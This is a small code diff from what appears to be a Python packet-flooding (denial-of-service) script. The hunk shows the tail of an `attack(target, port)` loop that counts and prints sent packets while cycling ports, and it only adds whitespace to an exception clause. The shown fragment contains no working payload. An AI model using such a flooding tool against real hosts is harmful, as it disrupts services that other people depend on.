@@ -46,7 +46,7 @@ def attack(target, port):
             attack_num += 1
             port = (port + 1) % 65535
             print(f"Sent {attack_num} packet to {target} through port: {port}")
-    except Exception as e:
+    except  Exception as  e:
         print("An error occurred during the attack:", e)
 
 attack(target, port)
